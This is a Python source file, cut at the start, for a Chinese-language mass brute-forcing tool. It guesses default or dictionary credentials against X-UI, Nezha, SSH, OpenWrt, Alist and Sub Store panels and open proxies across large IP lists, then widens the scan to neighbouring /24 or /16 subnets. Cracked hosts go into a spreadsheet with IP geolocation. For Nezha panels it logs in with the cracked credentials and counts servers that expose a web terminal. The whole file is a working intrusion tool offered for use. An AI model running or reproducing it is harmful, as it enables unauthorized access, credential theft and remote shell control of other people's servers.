    widths=[max(len(str(c)) for c in col) for col in zip(*rows)]
    for i,w in enumerate(widths):ws.set_column(i,i,w+2)
    wb.close();print("\nIP信息查询完成！")
if __name__=="__main__":
    if len(sys.argv)>2:p(sys.argv[1],sys.argv[2])
    else:print("Usage: python ipcx.py <input_file> <output_file>")
"""

# =========================== Functions ===========================

def generate_ipcx_py():
    with open('ipcx.py', 'w', encoding='utf-8') as f: f.write(IPCX_PY_CONTENT)
def debug_log(message, level="INFO"):
    colors = { "INFO": Fore.BLUE, "SUCCESS": Fore.GREEN, "WARNING": Fore.YELLOW, "ERROR": Fore.RED }
    print(f"[{level}] {colors.get(level, '')}{message}{Style.RESET_ALL}")

# (Nezha analysis functions)
def check_server_terminal_status(session,base_url,server_id):
    try:
        paths=[f"/dashboard/terminal/{server_id}",f"/dashboard/ssh/{server_id}",f"/dashboard/console/{server_id}",f"/dashboard/shell/{server_id}",f"/terminal/{server_id}",f"/ssh/{server_id}",f"/console/{server_id}",f"/shell/{server_id}"]
        for p in paths:
            try:
                r=session.get(base_url+p,timeout=5,verify=False)
                if r.status_code==200:
                    c=r.text.lower()
                    if"xterm"in c and not any(e in c for e in["not found","404","error","failed","unavailable","未找到","错误","失败","不可用","服务器不存在","尚未连接","terminal not available"]):return True
            except:continue
        return False
    except:return False
def count_terminal_accessible_servers(session,base_url):
    try:
        r=session.get(base_url+"/api/v1/server",timeout=TIMEOUT,verify=False)
        if r.status_code!=200:return 0,[]
        data,servers=r.json(),[]
        if isinstance(data,dict)and"error"in data and"unauthorized"in data.get("error","").lower():return check_terminal_status_via_pages(session,base_url)
        if isinstance(data,list):servers=data
        elif isinstance(data,dict)and"data"in data:servers=data["data"]
        if not servers:return 0,[]
        count,accessible_servers=0,[]
        for s in servers:
            if isinstance(s,dict)and"id"in s:
                sid,sname=s["id"],s.get("name",f"Server-{s['id']}")
                if check_server_terminal_status(session,base_url,sid):count+=1;accessible_servers.append({"id":sid,"name":sname,"status":"终端畅通"})
        return count,accessible_servers
    except:return 0,[]
def check_terminal_status_via_pages(session,base_url):
    try:
        r=session.get(base_url+"/dashboard",timeout=TIMEOUT,verify=False)
        if r.status_code==200:
            c=r.text.lower()
            if"xterm"in c and any(t in c for t in["terminal","ssh","console","shell"]):return 1,[{"id":"unknown","name":"Dashboard","status":"终端畅通"}]
        return 0,[]
    except:return 0,[]
def check_for_agents_and_terminal(session,base_url):
    total=0
    try:
        r=session.get(base_url+"/api/v1/server",timeout=TIMEOUT,verify=False)
        if r.status_code==200:
            d=r.json()
            if isinstance(d,list):total=len(d)
            elif isinstance(d,dict)and"data"in d and isinstance(d["data"],list):total=len(d["data"])
    except:pass
    if not total>0:return False,0,0,[]
    term_count,term_servers=count_terminal_accessible_servers(session,base_url)
    return True,term_count,total,term_servers
def analyze_panel(result_line):
    parts=result_line.split()
    if len(parts)<3:return result_line,(0,0,"格式错误")
    ip,user,passwd=parts[0],parts[1],parts[2]
    for proto in["http","https"]:
        base_url=f"{proto}://{ip}"
        s=requests.Session()
        try:
            requests.packages.urllib3.disable_warnings()
            r=s.post(f"{base_url}/api/v1/login",json={"username":user,"password":passwd},timeout=TIMEOUT,verify=False)
            if r.status_code==200:
                try:
                    j=r.json()
                    if"token"in j.get("data",{})or"nz-jwt"in r.headers.get("Set-Cookie",""):
                        if"token"in j.get("data",{}):s.headers.update({"Authorization":f"Bearer {j['data']['token']}"})
                        _,term_count,machine_count,term_servers=check_for_agents_and_terminal(s,base_url)
                        names=[s.get('name',s.get('id',''))for s in term_servers]
                        servers_str=", ".join(map(str,names))if names else"无"
                        return result_line,(machine_count,term_count,servers_str)
                except:continue
        except:continue
    return result_line,(0,0,"登录失败")

GO_EXEC="/usr/local/go/bin/go"
def update_excel_with_nezha_analysis(xlsx_file, analysis_data):
    if not os.path.exists(xlsx_file):
        print(f"{Fore.YELLOW}⚠️ Excel文件{xlsx_file}不存在，跳过更新。")
        return
    try:
        wb=load_workbook(xlsx_file)
        ws=wb.active
        headers=["服务器总数","终端畅通数","畅通服务器列表"]
        for i, h in enumerate(headers, 1):
            ws.cell(row=1, column=ws.max_column + i, value=h)
        header_map={cell.value: cell.column for cell in ws[1]}
        addr_col = header_map.get('原始地址')
        if not addr_col:
            print(f"{Fore.RED}❌ Excel中找不到 '原始地址' 列。")
            return
        for row_idx in range(2, ws.max_row + 1):
            addr=ws.cell(row=row_idx, column=addr_col).value
            if addr in analysis_data:
                m,t,s = analysis_data[addr]
                ws.cell(row=row_idx, column=ws.max_column-2, value=m)
                ws.cell(row=row_idx, column=ws.max_column-1, value=t)
                ws.cell(row=row_idx, column=ws.max_column, value=s)
        wb.save(xlsx_file)
        print(f"✅{Fore.GREEN}成功将哪吒面板分析结果写入Excel。")
    except Exception as e:
        print(f"{Fore.RED}❌更新Excel时发生错误: {e}")

def input_with_default(prompt, default):
    user_input = input(f"{prompt} (默认: {default})：").strip()
    return int(user_input) if user_input.isdigit() else default
def input_filename_with_default(prompt, default):
    user_input = input(f"{prompt} (默认: {default})：").strip()
    return user_input if user_input else default
def escape_go_string(s: str) -> str:
    return json.dumps(s)

def generate_go_code(go_file, template_lines, **kwargs):
    code = "\n".join(template_lines)
    code = code.replace("{timeout}", str(kwargs.get('timeout', 5)))
    code = code.replace("{semaphore_size}", str(kwargs.get('semaphore_size', 200)))
    if 'test_url' in kwargs:
        code = code.replace("{test_url}", kwargs['test_url'])
    if 'proxy_type' in kwargs:
        code = code.replace("{proxy_type}", kwargs['proxy_type'])
    code = code.replace("{user_list}", "[]string{" + ", ".join([escape_go_string(u) for u in kwargs.get('usernames', [])]) + "}")
    code = code.replace("{pass_list}", "[]string{" + ", ".join([escape_go_string(p) for p in kwargs.get('passwords', [])]) + "}")
    with open(go_file, 'w', encoding='utf-8') as f:
        f.write(code)

def compile_go_program(go_file, exec_name):
    if sys.platform == "win32":
        exec_name += ".exe"
    exec_path = os.path.abspath(exec_name)
    print(f"📦[编译] 正在编译Go程序 {go_file} -> {exec_path}...")
    go_env = os.environ.copy()
    go_env['GOGC'] = '500'
    if sys.platform != 'win32':
        if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
        if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'
    try:
        cmd = [GO_EXEC, 'build', '-ldflags', '-s -w', '-o', exec_path, go_file]
        p = subprocess.run(cmd, capture_output=True, text=True, check=True, encoding='utf-8', errors='ignore', env=go_env)
        if p.stderr:
            print(f"   - {Fore.YELLOW}⚠️ Go编译器警告: {p.stderr.strip()}")
        print(f"✅{Fore.GREEN}[编译]Go程序编译成功: {exec_path}")
        return exec_path
    except FileNotFoundError:
        print(f"{Fore.RED}❌[编译] 致命错误: Go编译器'{GO_EXEC}'未找到!"); return None
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}❌[编译]Go程序 {go_file} 编译失败!\n   - 错误:\n{Fore.RED}{e.stderr}"); return None

def adjust_oom_score():
    if sys.platform == "linux":
        try:
            with open(f"/proc/{os.getpid()}/oom_score_adj", "w") as f:
                f.write("-500")
            print(f"✅{Fore.GREEN}[系统] 成功调整OOM Score，降低被系统杀死的概率。")
        except PermissionError:
            print(f"⚠️ {Fore.YELLOW}[系统] 调整OOM Score失败: 权限不足。")
        except Exception as e:
            print(f"⚠️ {Fore.YELLOW}[系统] 调整OOM Score时发生未知错误: {e}")

def recommend_kernel_tuning():
    if sys.platform == "linux":
        print(f"\n🚀{Fore.CYAN}[系统调优建议] 为达到最佳扫描性能，建议以root身份运行以下命令：")
        print(f"{Fore.YELLOW}sysctl -w net.ipv4.ip_local_port_range=\"1024 65535\"")
        print(f"{Fore.YELLOW}sysctl -w net.core.somaxconn=65535")
        print(f"{Fore.YELLOW}sysctl -w net.ipv4.tcp_max_syn_backlog=8192")
        print(f"{Fore.YELLOW}sysctl -w net.ipv4.tcp_tw_reuse=1")
        print(f"{Fore.YELLOW}sysctl -w net.ipv4.tcp_fin_timeout=30")
        print(f"{Fore.CYAN}这些设置将在下次重启后失效。\n")
def increase_file_descriptor_limit():
    if resource:
        try:
            soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
            if soft < 65536:
                print(f"ℹ️ [系统] 当前文件描述符限制({soft})较低，尝试提升至65536...")
                resource.setrlimit(resource.RLIMIT_NOFILE, (min(65536, hard), hard))
                new_soft, _ = resource.getrlimit(resource.RLIMIT_NOFILE)
                print(f"✅{Fore.GREEN}[系统] 文件描述符限制已成功提升至{new_soft}。")
        except (ValueError, OSError) as e:
            print(f"⚠️ {Fore.YELLOW}[系统] 提升文件描述符限制失败: {e}。")

def check_and_manage_swap():
    if sys.platform == "linux":
        try:
            if psutil.swap_memory().total > 0:
                return
            mem_gb = psutil.virtual_memory().total / (1024**3)
            swap_gb = 8 if mem_gb > 32 else 4 if mem_gb > 8 else int(mem_gb/2) if int(mem_gb/2) > 2 else 2
            if input(f"⚠️ [系统] 警告: 未检测到Swap。内存为{mem_gb:.2f}GB。是否创建{swap_gb}GB的临时Swap？(y/N): ").strip().lower() == 'y':
                swap_f = "/tmp/autoswap.img"
                print(f"   - 正在创建{swap_gb}GB Swap文件: {swap_f}...")
                try:
                    subprocess.run(["fallocate", "-l", f"{swap_gb}G", swap_f], check=True)
                    subprocess.run(["chmod", "600", swap_f], check=True)
                    subprocess.run(["mkswap", swap_f], check=True)
                    subprocess.run(["swapon", swap_f], check=True)
                    atexit.register(cleanup_swap, swap_f)
                    print(f"✅[系统] 成功创建并启用了{swap_gb}GB Swap。")
                except Exception as e:
                    print(f"❌[系统]Swap文件创建失败: {e}")
        except Exception as e:
            print(f"❌[系统]Swap检查失败: {e}")

def cleanup_swap(swap_file):
    print(f"\n   - 正在禁用和清理临时Swap文件: {swap_file}...")
    try:
        subprocess.run(["swapoff", swap_file], check=False, capture_output=True)
        os.remove(swap_file)
        print("✅[系统] 临时Swap文件已成功清理。")
    except Exception as e:
        print(f"⚠️[系统] 清理Swap文件失败: {e}")

def process_chunk(lines, exec_path, timeout, lock, result_f):
    total_timeout = (len(lines) * timeout * 2) + 120 # Dynamic timeout
    try:
        p = subprocess.Popen([exec_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding='utf-8', errors='ignore')
        stdout, stderr = p.communicate(input="\n".join(lines), timeout=total_timeout)
        if stdout:
            with lock:
                with open(result_f, 'a', encoding='utf-8') as f:
                    f.write(stdout)
        if p.returncode != 0:
            return False, f"任务块失败, 返回码{p.returncode}。\n错误: {stderr}"
        return True, None
    except subprocess.TimeoutExpired:
        p.kill()
        p.communicate()
        return False, f"任务块超时({total_timeout}秒)被终止。"
    except Exception as e:
        return False, f"任务块意外错误: {e}"

def run_scan_in_parallel(lines, exec_path, py_con, go_con, chunk_size, timeout, result_f, manager):
    if not lines:
        print(f"⚠️ {Fore.YELLOW}没有需要扫描的目标。")
        return
    lock = manager.Lock()
    open(result_f, 'w').close()
    chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
    print(f"ℹ️ [扫描] 已将{len(lines)}个目标分为{len(chunks)}个任务块。")
    with ProcessPoolExecutor(max_workers=py_con) as executor:
        futures = [executor.submit(process_chunk, c, exec_path, timeout, lock, result_f) for c in chunks]
        with tqdm(total=len(chunks), desc=f"{Fore.CYAN}⚙️ [扫描]处理任务块", ncols=100) as pbar:
            for f in as_completed(futures):
                try:
                    s, e = f.result()
                    if not s:
                        tqdm.write(f"\n{Fore.YELLOW}⚠️ {e}")
                except Exception as ex:
                    tqdm.write(f"\n{Fore.RED}❌ 任务块严重异常: {ex}")
                pbar.update(1)

def run_single_ipcx_task(part_f, xlsx_out):
    try:
        subprocess.run([sys.executable, 'ipcx.py', part_f, xlsx_out], check=True, capture_output=True, text=True, encoding='utf-8')
        return xlsx_out
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}ipcx.py失败于{part_f}:\n{e.stderr}")
        return None
def merge_excel_files(files, final_out):
    print(f"合并{len(files)}个Excel报告中...")
    with XlsxWriterWorkbook(final_out) as final_wb:
        final_sh = final_wb.add_worksheet("IP信息")
        is_header, row_idx = False, 0
        for f in files:
            try:
                wb = load_workbook(f, read_only=True)
                ws = wb.active
                for i, row in enumerate(ws.iter_rows()):
                    if i == 0:
                        if not is_header:
                            final_sh.write_row(row_idx, 0, [c.value for c in row])
                            row_idx += 1
                            is_header = True
                    else:
                        final_sh.write_row(row_idx, 0, [c.value for c in row])
                        row_idx += 1
            except Exception as e:
                print(f"{Fore.YELLOW}⚠️无法合并{f}:{e}")

def parallelize_ip_info_generation(result_f, xlsx_f, con):
    if not (os.path.exists(result_f) and os.path.getsize(result_f) > 0):
        return
    print(f"\n📊[报告] 正在使用{con}个进程并行查询IP...")
    tmp_dir = "temp_ipcx_parts"
    os.makedirs(tmp_dir, exist_ok=True)
    parts = []
    with open(result_f, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    chunk_size = (len(lines) + con - 1) // con
    for i in range(con):
        chunk = lines[i * chunk_size:(i + 1) * chunk_size]
        if not chunk:
            continue
        part_f = os.path.join(tmp_dir, f"part_{i}.txt")
        with open(part_f, 'w', encoding='utf-8') as pf:
            pf.writelines(chunk)
        parts.append(part_f)
    excel_parts = []
    with ProcessPoolExecutor(max_workers=con) as executor:
        futures = {executor.submit(run_single_ipcx_task, p, os.path.join(tmp_dir, f"output_{i}.xlsx")): p for i, p in enumerate(parts)}
        with tqdm(total=len(parts), desc=f"{Fore.CYAN}  -[并行IP查询]", ncols=100) as pbar:
            for f in as_completed(futures):
                res = f.result()
                if res:
                    excel_parts.append(res)
                pbar.update(1)
    if excel_parts:
        merge_excel_files(sorted(excel_parts), xlsx_f)
    shutil.rmtree(tmp_dir, ignore_errors=True)

def parse_result_line(line):
    parts = line.strip().split()
    if not parts: return None, None, None, None
    ip_port = parts[0]
    user = parts[1] if len(parts) > 1 else ''
    passwd = parts[2] if len(parts) > 2 else ''
    if ':' in ip_port:
        ip, port = ip_port.rsplit(':', 1)
        return ip, port, user, passwd
    return None, None, None, None

def process_expandable_cluster(cluster_info, verif_exec_path, subnet_exec_path, master_results_set, go_con, params):
    subnet_prefix, port, user, passwd = cluster_info
    task_id = str(uuid.uuid4())
    newly_verified = set()
    try:
        cidr = f"{subnet_prefix}.0.0/16" if params['subnet_size'] == 16 else f"{subnet_prefix}.0/24"
        cmd = [subnet_exec_path, cidr, port, str(go_con * 2)]
        scan_proc = subprocess.run(cmd, capture_output=True, text=True, check=True)
        live_ips = {line.strip() for line in scan_proc.stdout.splitlines() if line.strip()}
        ips_to_verify = live_ips - master_results_set
        if not ips_to_verify:
            return set()

        verif_proc = subprocess.Popen([verif_exec_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding='utf-8')
        stdout, _ = verif_proc.communicate("\n".join(ips_to_verify))
        newly_verified = {line.strip() for line in stdout.splitlines() if line.strip()}
    except Exception:
        pass
    return newly_verified

def expand_scan_with_go(result_f, main_exec, template_map, py_con, go_con, params):
    if not (os.path.exists(result_f) and os.path.getsize(result_f) > 0):
        return set()
    print("\n🔍[扩展] 正在分析结果以寻找可扩展的IP网段...")
    with open(result_f, 'r', encoding='utf-8') as f:
        master_results = {line.strip() for line in f}

    generate_go_code("subnet_scanner.go", SUBNET_TCP_SCANNER_GO_TEMPLATE_LINES)
    subnet_scanner_exec = compile_go_program("subnet_scanner.go", "subnet_scanner_executable")
    if not subnet_scanner_exec:
        print(f"{Fore.RED}子网扫描器编译失败，跳过扩展扫描。")
        return set()

    all_new_ips = set()
    ips_to_analyze = master_results.copy()
    for i in range(2):
        print(f"\n--- [扩展扫描 第 {i+1}/2 轮] ---")
        groups = {}
        for line in ips_to_analyze:
            ip, port, user, passwd = parse_result_line(line)
            if not ip: continue
            subnet = ".".join(ip.split('.')[:2]) if params['subnet_size'] == 16 else ".".join(ip.split('.')[:3])
            key = (subnet, port, user, passwd)
            if key not in groups: groups[key] = set()
            groups[key].add(line.split()[0])
        
        expandable_targets = [k for k, v in groups.items() if len(v) >= 2]
        if not expandable_targets:
            print(f"  - 第{i+1}轮未找到符合条件的IP集群，扩展扫描结束。")
            break
        print(f"  - 第{i+1}轮发现{len(expandable_targets)}个可扩展集群，开始并行扫描...")
        
        new_this_round = set()
        with ProcessPoolExecutor(max_workers=py_con) as executor:
            futures = {}
            # Pre-compile verifiers
            verifiers = {}
            for cluster in expandable_targets:
                _, _, user, passwd = cluster
                verifier_key = f"{user}_{passwd}"
                if verifier_key not in verifiers:
                    verify_params=params.copy(); verify_params.update({'usernames':[user], 'passwords':[passwd]})
                    verifier_go=f"verifier_{verifier_key}.go"; verifier_exec=f"verifier_exec_{verifier_key}"
                    generate_go_code(verifier_go, template_map[TEMPLATE_MODE], **verify_params)
                    compiled_verifier = compile_go_program(verifier_go, verifier_exec)
                    verifiers[verifier_key] = compiled_verifier

            for cluster in expandable_targets:
                _, _, user, passwd = cluster; verifier_key = f"{user}_{passwd}"
                if verifiers.get(verifier_key):
                    futures[executor.submit(process_expandable_cluster, cluster, verifiers[verifier_key], subnet_scanner_exec, master_results, go_con, params)] = cluster

            with tqdm(total=len(futures), desc=f"  -[扩展集群 Round{i+1}]", ncols=100) as pbar:
                for future in as_completed(futures):
                    try:
                        new_finds = future.result(); new_this_round.update(new_finds)
                    except Exception as e: print(f"\n  - 扩展集群异常: {e}")
                    pbar.update(1)

        new_ips = new_this_round - master_results
        if not new_ips:
            print(f"--- 第{i+1}轮未发现新IP，扩展扫描结束。---")
            break
        print(f"--- 第{i+1}轮共发现{len(new_ips)}个新目标。---")
        master_results.update(new_ips); ips_to_analyze = new_ips; all_new_ips.update(new_ips)

    with open(result_f, 'r') as f:
        initial_set = {l.strip() for l in f}
    return master_results - initial_set

def run_go_tcp_prescan(source_lines, py_con, go_con, chunk_size, timeout, manager):
    print("\n--- 正在执行并行化Go TCP预扫描以筛选活性IP...")
    generate_go_code("tcp_prescan.go", TCP_ACTIVE_GO_TEMPLATE_LINES, semaphore_size=go_con, timeout=timeout)
    executable = compile_go_program("tcp_prescan.go", "tcp_prescan_executable")
    if not executable:
        print("  - ❌TCP预扫描程序编译失败，跳过。")
        return source_lines

    prescan_result_file = "prescan_results.tmp"
    run_scan_in_parallel(source_lines, executable, py_con, go_con, chunk_size, timeout, prescan_result_file, manager)
    
    live_targets = []
    if os.path.exists(prescan_result_file) and os.path.getsize(prescan_result_file) > 0:
        with open(prescan_result_file, 'r', encoding='utf-8') as f:
            live_targets = [l.strip() for l in f if l.strip()]
    print(f"--- ✅Go TCP预扫描完成。筛选出{len(live_targets)}个活性目标。---")
    if os.path.exists(prescan_result_file): os.remove(prescan_result_file)
    return live_targets

def get_nezha_server(config_file="config.yml"):
    if not os.path.exists(config_file): return "N/A"
    try:
        with open(config_file, 'r', encoding='utf-8') as f:
            config = yaml.safe_load(f)
            return config.get('server', "N/A")
    except Exception: return "N/A"
def choose_template_mode():
    print("请选择爆破模式："); print("1. XUI面板\n2. 哪吒面板\n3. SSH\n4. Sub Store\n5. OpenWrt/iStoreOS")
    print("--- 代理模式 ---"); print("6. SOCKS5 代理\n7. HTTP 代理\n8. HTTPS 代理")
    print("--- 其他面板 ---"); print("9. Alist 面板\n10. TCP 端口活性检测")
    mode_map={'1':1,'2':2,'3':6,'4':7,'5':8,'6':9,'7':10,'8':11,'9':12,'10':13,'':1}
    while True:
        choice = input("输入1-10之间的数字(默认:1)：").strip()
        if choice in mode_map: return mode_map[choice]
        print(f"❌{Fore.RED}输入无效，请重新输入。")
def is_in_china():
    print("    - 正在通过ping google.com检测网络环境...")
    try:
        if subprocess.run(["ping","-c","1","-W","2","google.com"],capture_output=True,check=False).returncode==0:
            print(f"    - 🌍{Fore.GREEN}Ping成功，判断为海外服务器。"); return False
        else:
            print(f"    - 🇨🇳{Fore.YELLOW}Ping超时或失败，判断为国内服务器，将自动使用镜像。"); return True
    except FileNotFoundError:
        print(f"    - {Fore.YELLOW}⚠️ 未找到ping命令，无法检测网络。"); return False
def check_environment(template_mode, is_china_env):
    if sys.platform.lower() == "windows": print(f">>> {Fore.YELLOW}检测到 Windows 系统，跳过环境检测...<<<\n"); return
    print(f">>> {Fore.CYAN}正在检查并安装依赖环境...{Style.RESET_ALL}")
    pkg_manager = "apt-get" if shutil.which("apt-get") else "yum" if shutil.which("yum") else None
    if not pkg_manager: print(f"❌ {Fore.RED}无法检测到 apt-get 或 yum。"); sys.exit(1)
    try:
        if pkg_manager == "apt-get":
            subprocess.run(["apt-get", "update", "-y"], check=True, capture_output=True)
            subprocess.run(["apt-get", "install", "-y", "curl", "iputils-ping", "iproute2"], check=True, capture_output=True)
        else:
            subprocess.run(["yum", "install", "-y", "curl", "iputils", "iproute"], check=True, capture_output=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(f"{Fore.RED}❌ 自动安装系统基础包失败。"); sys.exit(1)
    if not (os.path.exists(GO_EXEC) and subprocess.run([GO_EXEC, "version"], capture_output=True).returncode == 0):
        print(f"{Fore.YELLOW}--- Go环境未找到，正在自动安装... ---")
        go_url = "https://studygolang.com/dl/golang/go1.22.1.linux-amd64.tar.gz" if is_china_env else "https://go.dev/dl/go1.22.1.linux-amd64.tar.gz"
        print(f"    - 正在从 {go_url.split('/')[2]} 下载Go...")
        try:
            subprocess.run(["curl", "-#", "-Lo", "/tmp/go.tar.gz", go_url], check=True)
            subprocess.run(["rm", "-rf", "/usr/local/go"], check=True, capture_output=True)
            subprocess.run(["tar", "-C", "/usr/local", "-xzf", "/tmp/go.tar.gz"], check=True, capture_output=True)
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}❌ Go安装失败: {e.stderr.decode() if e.stderr else '未知错误'}"); sys.exit(1)
    go_env=os.environ.copy()
    if is_china_env: go_env['GOPROXY']='https://goproxy.cn,direct'
    if 'HOME' not in go_env: go_env['HOME']='/tmp'
    if 'GOCACHE' not in go_env: go_env['GOCACHE']='/tmp/.cache/go-build'
    if not os.path.exists("go.mod"):
        subprocess.run([GO_EXEC, "mod", "init", "xui_scanner"], quiet=True, extra_env=go_env)
    required_pkgs=["golang.org/x/crypto/ssh", "github.com/valyala/fasthttp"]
    print("    - 正在安装所有必需的Go模块...")
    try:
        for pkg in required_pkgs:
            subprocess.run([GO_EXEC, "get", pkg], check=True, capture_output=True, env=go_env)
    except subprocess.CalledProcessError as e:
        print(f"\n{Fore.RED}❌ Go模块安装失败: {e.stderr.decode(errors='ignore') if e.stderr else '未知错误'}"); sys.exit(1)
    print(f">>> ✅ {Fore.GREEN}环境依赖检测完成 ✅ <<<\n")
def load_credentials(template_mode):
    usernames, passwords = [], []
    auth_mode = 0
    if template_mode in [7, 12, 13]: # No creds needed
        return usernames, passwords
    if template_mode in [9, 10, 11]:
        auth_choice = input("请选择代理凭据模式 (1:无凭据, 2:字典) (默认:1):").strip()
        auth_mode = 2 if auth_choice == '2' else 1
    elif input("是否使用username.txt/password.txt字典库？(y/N):").strip().lower() == 'y':
        auth_mode = 2
    
    if auth_mode == 1:
        if template_mode not in [9,10,11]:
            usernames, passwords = (["root"], ["password"]) if template_mode == 8 else (["admin"], ["admin"])
    elif auth_mode == 2:
        if not (os.path.exists("username.txt") and os.path.exists("password.txt")):
            print(f"{Fore.RED}❌ 错误: 缺少username.txt或password.txt。"); sys.exit(1)
        with open("username.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
            usernames = [l.strip() for l in f if l.strip()]
        with open("password.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
            passwords = [l.strip() for l in f if l.strip()]

    if template_mode == 2:
        orig_len = len(passwords)
        passwords = [p for p in passwords if len(p) >= 8 or p.lower() == 'admin']
        if len(passwords) < orig_len:
            print(f"ℹ️ 哪吒模式: 过滤短密码, 保留{len(passwords)}/{orig_len}个。")
        if not passwords:
            print(f"{Fore.RED}❌ 错误: 过滤后密码字典为空。"); sys.exit(1)
    if auth_mode == 2 and (not usernames or not passwords):
        print(f"{Fore.RED}❌ 错误: 凭据文件为空。"); sys.exit(1)
    return usernames, passwords

def select_proxy_test_target():
    print("\n--- 代理测试目标选择 ---")
    opts={"1": "http://httpbin.org/ip", "2": "http://api.ipify.org/?format=json", "3": "https://httpbin.org/ip"}
    for k, v in opts.items():
        print(f"{k}: {v}")
    print("4: 自定义URL")
    choice=input("请选择(默认1):").strip()
    if choice in opts:
        return opts[choice]
    if choice == '4':
        custom = input("请输入自定义URL:").strip()
        return custom if custom else opts["1"]
    return opts["1"]
def get_vps_info():
    try:
        r = requests.get("http://ip-api.com/json/?fields=country,query", timeout=5)
        d = r.json()
        return d.get('query', 'N/A'), d.get('country', 'N/A')
    except:
        return "N/A", "N/A"
# (Final script part)
if __name__ == "__main__":
    start = time.time()
    interrupted = False
    atexit.register(clean_temp_files)
    try:
        print(f"\n🚀{Fore.CYAN}=== 爆破一键启动 (终极版) ==={Style.RESET_ALL}🚀")
        recommend_kernel_tuning()
        increase_file_descriptor_limit()
        check_and_manage_swap()
        is_china_env = is_in_china()
        TEMPLATE_MODE = choose_template_mode()
        check_environment(TEMPLATE_MODE, is_china_env)
        input_f = input_filename_with_default("📝 请输入源文件名", "1.txt")
        if not os.path.exists(input_f):
            print(f"❌{Fore.RED} 错误: 文件'{input_f}'不存在。")
            sys.exit(1)
        all_lines = [l.strip() for l in open(input_f, 'r', encoding='utf-8', errors='ignore') if l.strip()]
        total_ips = len(all_lines)
        print(f"--- 📝 总计{total_ips}个目标 ---")
        cpu_cores = os.cpu_count() or 1
        py_con = input_with_default("请输入Python并发进程数", cpu_cores)
        go_con = input_with_default("请输入Go并发数", 200)
        chunk_size = input_with_default("请输入任务块IP数", 1000)
        params = {'semaphore_size': go_con}
        params['timeout'] = input_with_default("超时(秒)", 5)
        with Manager() as manager:
            if input("是否启用Go TCP预扫描？(y/N): ").strip().lower() == 'y':
                all_lines = run_go_tcp_prescan(all_lines, py_con, go_con, chunk_size, params['timeout'], manager)
                if not all_lines:
                    print("预扫描后无活性目标，脚本结束。")
                    sys.exit(0)
            params['usernames'], params['passwords'] = load_credentials(TEMPLATE_MODE)
            if TEMPLATE_MODE in [9, 10, 11]:
                params['proxy_type'] = {10: 'http', 11: 'https'}.get(TEMPLATE_MODE, 'socks5')
                params['test_url'] = select_proxy_test_target()
            
            template_map = {1:XUI_GO_TEMPLATE_1_LINES, 2:XUI_GO_TEMPLATE_2_LINES, 6:XUI_GO_TEMPLATE_6_LINES, 7:XUI_GO_TEMPLATE_7_LINES, 8:XUI_GO_TEMPLATE_8_LINES, 9:SOCKS5_PROXY_GO_TEMPLATE_LINES, 10:HTTP_PROXY_GO_TEMPLATE_LINES, 11:HTTP_PROXY_GO_TEMPLATE_LINES, 12:ALIST_GO_TEMPLATE_LINES, 13:TCP_ACTIVE_GO_TEMPLATE_LINES}
            generate_go_code("xui.go", template_map[TEMPLATE_MODE], **params)
            main_executable = compile_go_program("xui.go", "xui_executable")
            if not main_executable:
                sys.exit(1)
            
            generate_ipcx_py()
            
            from datetime import datetime, timedelta, timezone
            beijing_time = datetime.now(timezone.utc) + timedelta(hours=8)
            time_str = beijing_time.strftime("%Y%m%d-%H%M")
            mode_map={1:"XUI", 2:"哪吒", 6:"ssh", 7:"substore", 8:"OpenWrt", 9:"SOCKS5", 10:"HTTP", 11:"HTTPS", 12:"Alist", 13:"TCP-Active"}
            prefix=mode_map.get(TEMPLATE_MODE,"result")
            final_txt_file=f"{prefix}-{time_str}.txt"
            final_xlsx_file=f"{prefix}-{time_str}.xlsx"
            
            run_scan_in_parallel(all_lines, main_executable, py_con, go_con, chunk_size, params['timeout'], final_txt_file, manager)
            
            if TEMPLATE_MODE in [1,2,6,8] and input("是否启用子网扩展扫描?(y/N):").strip().lower()=='y':
                size_choice=input("选择子网扩展范围(1:/24, 2:/16, 默认1):").strip()
                params['subnet_size']=16 if size_choice=='2' else 24
                newly_found=expand_scan_with_go(final_txt_file, main_executable, template_map, py_con, go_con, params)
                if newly_found:
                    print(f"---[扩展] 扫描完成, 新增{len(newly_found)}个结果, 正在合并...")
                    with open(final_txt_file, 'a', encoding='utf-8') as f:
                        for res in sorted(list(newly_found)):
                            f.write(res + '\n')
                    with open(final_txt_file, 'r', encoding='utf-8') as f:
                        unique_lines = sorted(list(set(f.readlines())))
                    with open(final_txt_file, 'w', encoding='utf-8') as f:
                        f.writelines(unique_lines)
                    print("---[扩展] 结果合并去重完成。---")

            parallelize_ip_info_generation(final_txt_file, final_xlsx_file, py_con)
            if TEMPLATE_MODE == 2 and os.path.exists(final_txt_file) and os.path.getsize(final_txt_file) > 0:
                print(f"\n---🔍[分析] 开始对哪吒面板进行深度分析...")
                with open(final_txt_file, 'r') as f:
                    results = [l.strip() for l in f if l.strip()]
                analysis_data = {}
                with ProcessPoolExecutor(max_workers=py_con) as executor:
                    futures = {executor.submit(analyze_panel, res): res for res in results}
                    for f in tqdm(as_completed(futures), total=len(results), desc="[🔍]分析哪吒面板", ncols=100):
                        analysis_data[futures[f]] = f.result()[1]
                if analysis_data:
                    update_excel_with_nezha_analysis(final_xlsx_file, analysis_data)
        
    except KeyboardInterrupt:
        print(f"\n>>>🛑{Fore.YELLOW}用户中断操作...{Style.RESET_ALL}")
        interrupted = True
    except Exception as e:
        import traceback
        traceback.print_exc()
        print(f"\n❌{Fore.RED}发生意外错误: {e}")
        interrupted = True
    finally:
        end = time.time()
        cost = int(end - start)
        run_time_str = f"{cost//60}分 {cost%60}秒"
        if interrupted:
            print(f"\n===🛑{Fore.YELLOW}脚本中断, 运行{run_time_str}{Style.RESET_ALL}===")
        else:
            print(f"\n===🎉{Fore.GREEN}全部完成！总用时{run_time_str}{Style.RESET_ALL}===")

